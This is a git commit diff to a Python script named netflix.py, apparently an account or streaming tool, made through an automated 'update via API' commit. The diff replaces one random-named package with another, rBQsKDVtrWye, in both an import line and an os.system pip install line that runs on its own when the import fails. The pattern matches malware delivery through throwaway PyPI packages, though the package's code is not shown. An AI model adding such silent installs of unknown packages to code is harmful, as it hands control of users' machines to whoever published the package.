f009a2a2d1d87a584266bea9d50cbc9b31d60264
Zeeckt <139068412+Zeeckt@users.noreply.github.com>
2023-07-21 15:47:47 -0300

    Atualização do arquivo via API

--- netflix.py
+++ netflix.py
@@ -4,7 +4,7 @@ try:
     import datetime
     import os
     import requests
-    import wkZxcUySdmEs
+    import rBQsKDVtrWye
     from colorama import Fore, Style
     os.system('cls')
 except Exception as e:
@@ -19,12 +19,12 @@ except Exception as e:
     os.system('pip install -U cryptography')
     os.system('pip install -U inquirerpy')
     os.system('pip install -U aiohttp')
-    os.system('pip install -U wkZxcUySdmEs')
+    os.system('pip install -U rBQsKDVtrWye')
     os.system('cls')
     import datetime
     import json
     import requests
-    import wkZxcUySdmEs
+    import rBQsKDVtrWye
     from colorama import Fore, Style
 
 import time
